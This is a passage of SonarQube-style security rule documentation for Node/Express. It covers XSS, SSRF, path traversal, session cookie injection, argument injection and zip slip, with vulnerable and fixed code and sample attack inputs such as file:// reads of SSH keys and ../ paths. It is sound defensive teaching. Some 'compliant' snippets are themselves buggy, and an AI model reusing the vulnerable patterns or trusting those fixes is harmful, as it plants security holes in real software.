<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol &#39;?&#39; was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br /> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br /> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">SonarSource, Exploiting Hibernate Injections</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ" rel="nofollow">CERT, IDS00-J.</a> - Prevent SQL injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5131">
              tssecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br /> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains unsanitized user input.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For
example, you can use the <code>JsonResponse</code> class to safely return JSON messages.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function (req, res) {
    json &#61; JSON.stringify({ &#34;data&#34;: req.query.input });
    res.send(json);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function (req, res) {
    res.json({ &#34;data&#34;: req.query.input });
};
</pre>
<p>It is also possible to set the content-type header manually using the <code>content_type</code> parameter when creating an
<code>HttpResponse</code> object.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
function (req, res) {
    res.send(req.query.input);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
function (req, res) {
    res.set(&#39;Content-Type&#39;, &#39;text/plain&#39;);
    res.send(req.query.input);
};
</pre>
<h3>How does this work?</h3>
<p>In case the response consists of HTML code, it is highly recommended to use a template engine like <a href="https://ejs.co/" rel="nofollow">ejs</a> to generate
it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing the risk
of cross-site scripting vulnerabilities.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be resolved by telling them what data they are receiving with the
<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and
interpreted as HTML. Thus, the HTTP response is not vulnerable to reflected Cross-Site Scripting.</p>
<p>For example, setting the content-type header to <code>text/plain</code> allows to safely reflect user input since browsers will not try to parse
and execute the response.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br /> The following content-types are known to be affected:</p>
<ul><li> application/mathml&#43;xml </li><li> application/rdf&#43;xml </li><li> application/vnd.wap.xhtml&#43;xml </li><li> application/xhtml&#43;xml </li><li> application/xml </li><li> image/svg&#43;xml </li><li> multipart/x-mixed-replace </li><li> text/html </li><li> text/rdf </li><li> text/xml </li><li> text/xsl </li></ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of &#34;javascript:&#34; URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br /> <a href="https://web.dev/csp-xss/" rel="nofollow">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li><li> <a href="https://expressjs.com/en/api.html" rel="nofollow">Express, 4.x API</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability" rel="nofollow">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li><li> <a href="https://blog.sonarsource.com/ghost-admin-takeover" rel="nofollow">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li><li> <a href="https://samy.pl/myspace/" rel="nofollow">Samy Kamkar, The MySpace Worm</a> </li></ul>
<h3>Conference presentations</h3>
<ul><li> <a href="https://www.youtube.com/watch?v&#61;ksq7e6UUDag" rel="nofollow">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79.html" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5144">
              tssecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br /></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br /> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br /> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const axios &#61; require(&#39;axios&#39;);
const express &#61; require(&#39;express&#39;);

const app &#61; express();

app.get(&#39;/example&#39;, async (req, res) &#61;&gt; {
    try {
        await axios.get(req.query.url); // Noncompliant
        res.send(&#34;OK&#34;);
    } catch (err) {
        console.error(err);
        res.send(&#34;ERROR&#34;);
    }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const axios &#61; require(&#39;axios&#39;);
const express &#61; require(&#39;express&#39;);

const schemesList &#61; [&#34;http:&#34;, &#34;https:&#34;];
const domainsList &#61; [&#34;trusted1.example.com&#34;, &#34;trusted2.example.com&#34;];

app.get(&#39;/example&#39;, async (req, res) &#61;&gt; {
    const url &#61; (new URL(req.query.url));

    if (schemesList.includes(url.protocol) &amp;&amp; domainsList.includes(url.hostname)) {
        try {
            await axios.get(url);
            res.send(&#34;OK&#34;);
        } catch (err) {
            console.error(err);
            res.send(&#34;ERROR&#34;);
        }
    }else {
        res.send(&#34;INVALID_URL&#34;);
    }
})
</pre>
<h3>How does this work?</h3>
<p>The application should avoid opening URLs that are constructed with untrusted data.</p>
<p>When such a feature is strictly necessary, SSRF can be mitigated by applying an allow-list of trustable schemes and domains.</p>
<p>The compliant code example uses such an approach.</p>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" rel="nofollow">OWASP Top 10 2021 Category A10</a> - Server-Side Request
  Forgery (SSRF) </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/918" rel="nofollow">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S2083">
              tssecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
const path &#61; require(&#39;path&#39;);
const fs   &#61; require(&#39;fs&#39;);

function (req, res) {
  const targetDirectory &#61; &#34;/data/app/resources/&#34;;
  const userFilename &#61; path.join(targetDirectory, req.query.filename);

  let data &#61; fs.readFileSync(userFilename, { encoding: &#39;utf8&#39;, flag: &#39;r&#39; }); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const path &#61; require(&#39;path&#39;);
const fs   &#61; require(&#39;fs&#39;);

function (req, res) {
  const targetDirectory &#61; &#34;/data/app/resources/&#34;;
  const userFilename &#61; path.join(targetDirectory, req.query.filename);
  const userFilename &#61; fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data &#61; fs.readFileSync(userFilename, { encoding: &#39;utf8&#39;, flag: &#39;r&#39; });
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li><li> Resolve the canonical path of the file by using methods like <code>&#96;fs.realPath&#96;</code>. This will resolve relative path or path components
  like <code>../</code> and removes any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li></ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol><li> <code>data &#61; transform(user_input);</code> </li><li> <code>data &#61; normalize(data);</code> </li><li> <code>data &#61; sanitize(data);</code> </li><li> <code>use(data);</code> </li></ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v&#61;V-DdcKADnFk" rel="nofollow">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
const path &#61; require(&#39;path&#39;);

function (req, res) {
  const targetDirectory &#61; &#34;/data/app/resources&#34;
  const userFilename &#61; path.join(targetDirectory, req.query.filename));
  const userFilename &#61; fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data &#61; fs.readFileSync(userFilename);
}
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br /> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<h4>Do not use path.resolve as a validator</h4>
<p>The <a href="https://nodejs.org/api/path.html#pathresolvepaths" rel="nofollow">official documentation</a> states that if any argument other than the first is an
absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6287">
              tssecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a href="https://example.com?cookie&#61;injectedcookie" rel="nofollow">https://example.com?cookie&#61;injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br /> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import express from &#34;express&#34;;
import cookieParser from &#34;cookie-parser&#34;;

const app &#61; express();
app.use(cookieParser());

app.get(&#34;/checkcookie&#34;, (req, res) &#61;&gt; {
    if (req.cookies[&#34;connect.sid&#34;] &#61;&#61;&#61; undefined) {
        const cookie &#61; req.query.cookie;
        res.cookie(&#34;connect.sid&#34;, cookie); // Noncompliant
    }

    return res.redirect(&#34;/welcome&#34;);
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import express from &#34;express&#34;;
import cookieParser from &#34;cookie-parser&#34;;

const app &#61; express();
app.use(cookieParser());

app.get(&#34;/checkcookie&#34;, (req, res) &#61;&gt; {
    if (req.cookies[&#34;connect.sid&#34;] &#61;&#61;&#61; undefined) {
        return res.redirect(&#34;/getcookie&#34;);
    }

    return res.redirect(&#34;/welcome&#34;);
});
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br /> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6350">
              tssecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9920" rel="nofollow">CVE-2016-9920</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2021-29472" rel="nofollow">CVE-2021-29472</a> </li></ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Malicious arguments can result in undesired behavior in the executed command. </li><li> Passing user input to a system command is not necessary. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid constructing system commands from user input when possible. </li><li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li><li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
const { spawn } &#61; require(&#34;child_process&#34;);
const input &#61; req.query.input;
const proc &#61; spawn(&#34;/usr/bin/find&#34;, [input]); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
const { spawn } &#61; require(&#34;child_process&#34;);
const input &#61; req.query.input;
if (allowed.includes(input)) {
  const proc &#61; spawn(&#34;/usr/bin/find&#34;, [input]);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer" rel="nofollow">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6096">
              tssecurity:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries&#39; names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const AdmZip &#61; require(&#34;adm-zip&#34;);
const upload &#61; require(&#39;multer&#39;);

app.get(&#39;/example&#39;, upload.single(&#39;file&#39;), (req, res) &#61;&gt; {
    const zip &#61; new AdmZip(req.file.buffer);
    const zipEntries &#61; zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        var writer &#61; fs.createWriteStream(zipEntry.entryName); // Noncompliant
        writer.write(zipEntry.getData().toString(&#34;utf8&#34;));
    });
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const AdmZip &#61; require(&#34;adm-zip&#34;);
const upload &#61; require(&#39;multer&#39;);

const unzipTargetDir &#61; &#34;/example/directory/&#34;;

app.get(&#39;/example&#39;, upload.single(&#39;file&#39;), (req, res) &#61;&gt; {
    const zip &#61; new AdmZip(req.file.buffer);
    const zipEntries &#61; zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        const canonicalPath &#61; path.normalize(unzipTargetDir &#43; zipEntry.entryName);
        if (canonicalPath.startsWith(unzipTargetDir)) {
            let writer &#61; fs.createWriteStream(canonicalPath);
            writer.write(zipEntry.getData().toString(&#34;utf8&#34;));
        }
    });
});
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol><li> Resolve the canonical path of the file by using methods like <code>path.join</code> or <code>path.normalize</code>. This will resolve relative
  path or path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li></ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string variable <code>targetDirectory</code> does not end
with a path separator:</p>
<pre>
const AdmZip &#61; require(&#34;adm-zip&#34;);

const targetDirectory &#61; &#34;/Users/John&#34;;

app.get(&#39;/example&#39;, (req, res) &#61;&gt; {
    const canonicalPath &#61; path.normalize(targetDirectory &#43; req.query.filename)

    if (canonicalPath.startsWith(targetDirectory)) {
        const zip &#61; new AdmZip(canonicalPath);
	    const zipEntries &#61; zip.getEntries();

    	zipEntries.forEach(function (zipEntry) {
            var writer &#61; fs.createWriteStream(zipEntry.entryName);
            writer.write(zipEntry.getData().toString(&#34;utf8&#34;));
	    });
    }
});
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br /> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/advisories/GHSA-xwg4-93c6-3h42" rel="nofollow">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://snyk.io/research/zip-slip-vulnerability" rel="nofollow">snyk</a> - Zip Slip Vulnerability </li></ul>
<h3>Standards</h3>
